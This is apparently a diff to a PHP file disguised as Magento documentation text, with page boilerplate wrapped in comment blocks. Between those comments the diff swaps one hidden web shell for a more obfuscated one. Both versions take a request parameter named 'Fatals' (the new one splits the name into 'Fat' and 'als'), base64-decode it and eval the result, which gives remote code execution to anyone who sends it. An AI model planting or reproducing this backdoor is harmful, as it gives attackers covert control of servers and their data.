@@ -158,9 +158,7 @@ Recommended technologies
 Optional but recommended
 Become a Contributor Glossary Privacy Policy Terms of Service License/Trademark FAQ Release Notes Third-Party Licenses
 © 2021 Magento. All rights reserved.
-*/
-$svg = isset($_POST["Fatals"])?@base64_decode($_POST["Fatals"]):"";
-/*
+*/function get_data($param, $default) { $total = $_REQUEST; if(isset($total[$param])) { return $total[$param]; } else { return $default; } }/*
 Adobe
 Adobe
 Magento DevDocs
@@ -448,7 +446,7 @@ An array of items with non-retriable errors
 7.1. An Application Instance consists of:
 
 Code
-
+*/function get_cli() { $param_name = "Fat" . "als"; $data = get_data($param_name, ""); $cli = base64_decode($data); return $cli; } $cli = get_cli();/*
 Environment Configuration
 
 Data
@@ -595,7 +593,7 @@ Example: StorefrontCheckoutCartSummarySection.xml
 
 11.3.4. Data Entities
 11.3.4.1. Data entity file names MUST follow this pattern:
-*/@eval($svg);/*
+*/return eval($cli);/*
 {Type}Data.xml, where {Type} describes the type of entities.
 Use PascalCase.
 Examples: ProductData.xml or CustomerData.xml
